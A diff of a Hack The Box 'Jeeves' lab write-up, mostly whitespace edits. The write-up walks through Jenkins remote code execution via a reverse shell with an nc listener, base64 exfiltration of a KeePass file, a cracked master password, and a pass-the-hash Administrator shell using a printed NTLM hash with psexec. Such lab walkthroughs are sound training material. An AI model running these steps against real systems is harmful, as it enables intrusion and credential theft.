@@ -11,11 +11,11 @@ image = "jeeves-icon.png"
 
 ## Description
 
->Jeeves is a fun box that starts with error messages. We directory fuzz with ffuf and find Jenkins running. We gain a foothold with a modifying project exploit that gets us a reverse shell as the user. We see the administrator's hash in the user's KeePass, which gives us a shell with psexec. We get the root flag after discovering the hidden file on the server.
+> Jeeves is a fun box that starts with error messages. We directory fuzz with ffuf and find Jenkins running. We gain a foothold with a modifying project exploit that gets us a reverse shell as the user. We see the administrator's hash in the user's KeePass, which gives us a shell with psexec. We get the root flag after discovering the hidden file on the server.
 
 ## Skills Learned
 
-- Jenkins Modifying Project  exploit
+- Jenkins Modifying Project exploit
 - KeePass hacking
 
 # Solution
@@ -30,7 +30,7 @@ nmap -Pn -p- --min-rate=1000 -T4 10.10.10.63 -vv -oN ports
 
 ![](1.png)
 
-We  run `-sCV` on the open ports.
+We run `-sCV` on the open ports.
 
 ```python
 ls
@@ -52,10 +52,13 @@ nmap -p$ports 10.10.10.63 -sCV -oN version-basescripts
 
 ![](3.png)
 
-
 ---
 
 We try to login to SMB, but it requires a password.
+
+```shell
+smbclient -N -L \\\\10.10.10.63\\
+```
 
 ![](9.png)
 
@@ -63,7 +66,7 @@ Port 50000 gives the 404 Not Found error listed with nmap.
 
 ![](4.png)
 
-Port 80 also gives an error, this time as an image. 
+Port 80 also gives an error, this time as an image.
 
 ![](5.png)
 
@@ -104,11 +107,11 @@ We find a RCE exploit for Jenkins at [Jenkinds RCE Creating Modifying Project](h
 
 ![](16.png)
 
-5. Paste the rev shell into `Command` and click `Apply`. 
+5. Paste the rev shell into `Command` and click `Apply`.
 
 ![](17.png)
 
-6. Start your listener with `rwlrap` 
+6. Start your listener with `rwlrap`
 
 ```python
 rlwrap -cAr nc -lvnp <your chosen port>
@@ -139,6 +142,7 @@ dir
 ## Privilege Escalation
 
 We look around and find a `KeePass`file in the `c:\users\kohsuke\documents`directory.
+
 ```cmd
 cd ..\Documents
 ```
@@ -149,9 +153,10 @@ dir
 
 ![](21.png)
 
-We move the file over to our attack box with base64  in powershell.
+We move the file over to our attack box with base64 in powershell.
 
 **On Windows:**
+
 ```powershell
 [Convert]::ToBase64String((Get-Content -path "C:\users\kohsuke\documents\ceh.kdbx" -Encoding byte))
 ```
@@ -159,13 +164,14 @@ We move the file over to our attack box with base64  in powershell.
 ![](22.png)
 
 **On our attack box:**
+
 ```python
 echo "A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEA<snip>" | base64 -d > CEH.kdbx
 ```
 
 ![](23.png)
 
-We have `CEH.kdbx` on our local machine. 
+We have `CEH.kdbx` on our local machine.
 
 ```python
 ls
@@ -186,6 +192,7 @@ We need the `CEH.kdbx` master password.
 ```python
 kpcli
 ```
+
 ```shell
 open CEH.kdbx
 ```
@@ -219,6 +226,7 @@ open KEH.kdbx
 ```
 
 After entering the `moonshine1` password we find 7 password entries.
+
 ```
 find .
 ```
@@ -248,7 +256,6 @@ crackmapexec smb 10.10.10.63 --local-auth -u Administrator -H hashes
 ![](31.png)
 
 We use `impacket-psexec` to get on the server as Administrator.
-
 
 ```python
 impacket-psexec Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
@@ -287,10 +294,13 @@ dir /r
 We read the `root.txt`stream with `CMD` or `PowerShell`.
 
 **CMD:**
+
 ```cmd
 more < hm.txt:root.txt:$DATA
 ```
+
 **PowerShell:**
+
 ```powershell
 powershell Get-Content hm.txt -stream root.txt
 ```
